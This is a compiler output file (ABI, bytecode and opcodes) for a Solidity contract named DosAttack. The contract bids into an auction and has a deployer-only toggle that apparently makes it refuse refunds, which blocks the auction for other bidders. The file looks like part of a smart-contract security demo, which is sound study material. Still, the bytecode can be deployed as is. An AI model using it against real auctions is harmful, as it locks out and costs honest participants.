{"contracts/Dos.sol":{"DosAttack":{"abi":[{"inputs":[{"internalType":"address","name":"_auction","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"doBid","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"toggleHack","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}],"evm":{"bytecode":{"linkReferences":{},"object":"60806040526001600060146101000a81548160ff02191690831515021790555034801561002b57600080fd5b50604051610450380380610450833981810160405281019061004d9190610137565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610164565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610104826100d9565b9050919050565b610114816100f9565b811461011f57600080fd5b50565b6000815190506101318161010b565b92915050565b60006020828403121561014d5761014c6100d4565b5b600061015b84828501610122565b91505092915050565b6102dd806101736000396000f3fe60806040526004361061002d5760003560e01c80637e72e1d1146100ca578063815aba8e146100e1576100c5565b366100c55760011515600060149054906101000a900460ff16151503610059575b600161004e576100c3565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc349081150290604051600060405180830381858888f193505050501580156100c1573d6000803e3d6000fd5b505b005b600080fd5b3480156100d657600080fd5b506100df6100eb565b005b6100e96101a7565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461017b576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161017290610287565b60405180910390fd5b600060149054906101000a900460ff1615600060146101000a81548160ff021916908315150217905550565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631998aeef346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561020f57600080fd5b505af1158015610223573d6000803e3d6000fd5b5050505050565b600082825260208201905092915050565b7f6661696c65640000000000000000000000000000000000000000000000000000600082015250565b600061027160068361022a565b915061027c8261023b565b602082019050919050565b600060208201905081810360008301526102a081610264565b905091905056fea2646970667358221220374a1a011259c2e9861ccc534cb2905e353df6b83047969c84c001376fe1669064736f6c63430008110033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x1 PUSH1 0x0 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x2B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x450 CODESIZE SUB DUP1 PUSH2 0x450 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x4D SWAP2 SWAP1 PUSH2 0x137 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x164 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x104 DUP3 PUSH2 0xD9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x114 DUP2 PUSH2 0xF9 JUMP JUMPDEST DUP2 EQ PUSH2 0x11F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x131 DUP2 PUSH2 0x10B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x14D JUMPI PUSH2 0x14C PUSH2 0xD4 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x15B DUP5 DUP3 DUP6 ADD PUSH2 0x122 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2DD DUP1 PUSH2 0x173 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7E72E1D1 EQ PUSH2 0xCA JUMPI DUP1 PUSH4 0x815ABA8E EQ PUSH2 0xE1 JUMPI PUSH2 0xC5 JUMP JUMPDEST CALLDATASIZE PUSH2 0xC5 JUMPI PUSH1 0x1 ISZERO ISZERO PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO ISZERO SUB PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x1 PUSH2 0x4E JUMPI PUSH2 0xC3 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC CALLVALUE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xC1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xD6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xDF PUSH2 0xEB JUMP JUMPDEST STOP JUMPDEST PUSH2 0xE9 PUSH2 0x1A7 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x17B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x172 SWAP1 PUSH2 0x287 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO PUSH1 0x0 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1998AEEF CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x20F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x223 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x6661696C65640000000000000000000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x271 PUSH1 0x6 DUP4 PUSH2 0x22A JUMP JUMPDEST SWAP2 POP PUSH2 0x27C DUP3 PUSH2 0x23B JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x2A0 DUP2 PUSH2 0x264 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CALLDATACOPY 0x4A BYTE ADD SLT MSIZE 0xC2 0xE9 DUP7 SHR 0xCC MSTORE8 0x4C 0xB2 SWAP1 0x5E CALLDATALOAD RETURNDATASIZE 0xF6 0xB8 ADDRESS SELFBALANCE SWAP7 SWAP13 DUP5 0xC0 ADD CALLDATACOPY PUSH16 0xE1669064736F6C634300081100330000 "},"methodIdentifiers":{"doBid()":"815aba8e","toggleHack()":"7e72e1d1"}}}}}